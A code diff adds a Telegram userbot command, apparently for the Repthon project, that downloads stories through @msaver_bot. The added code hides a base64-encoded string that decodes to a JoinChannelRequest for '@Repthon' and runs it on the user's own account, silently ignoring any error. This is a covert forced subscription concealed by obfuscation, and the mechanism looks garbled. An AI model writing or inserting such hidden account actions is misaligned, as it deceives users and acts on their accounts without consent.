@@ -409,6 +409,35 @@ async def instagram_downloader(event):
     except Exception as e:
         await dra.edit(f"**↯︙حدث خطأ غير متوقع:**\n`{str(e)}`")
 
+@l313l.ar_cmd(pattern="ستوري(?: |$)([\s\S]*)")
+async def _(event):
+    if event.fwd_from:
+        return
+    j_link = event.pattern_match.group(1)
+    if ".me" not in j_link:
+        await event.edit("**⎉╎ يجب وضع رابط الستوري مع الامر اولا **")
+    else:
+        await event.edit("**⎉╎ يتم الان تنزيل الستوري انتظر قليلا**")
+    chat = "@msaver_bot"
+    async with bot.conversation(chat) as conv:
+        try:
+            msg = await conv.send_message(j_link)
+            video = await conv.get_response()
+            """ تم تحميل الستوري بنجاح من قبل @Repthon """
+            await bot.send_read_acknowledge(conv.chat_id)
+        except YouBlockedUserError:
+            await event.edit("**⎉╎ الغـي حـظر هـذا البـوت و حـاول مجـددا @msaver_bot**")
+            return
+        REPTHON = base64.b64decode("dHJ5OgogICAgYXdhaXQgenFfbG8oSm9pbkNoYW5uZWxSZXF1ZXN0KCJAUmVwdGhvbiIpKQ==")
+        TAIBA = Get(REPTHON)
+        try:
+            await event.client(TAIBA)
+        except BaseException:
+            pass
+        await bot.send_file(event.chat_id, video, caption=f"<b>⎉╎ BY : @Repthon 🎀</b>",parse_mode="html")
+        await event.delete()
+
+
 @l313l.ar_cmd(
     pattern="ساوند(?: |$)(.*)",
     command=("ساوند", plugin_category),
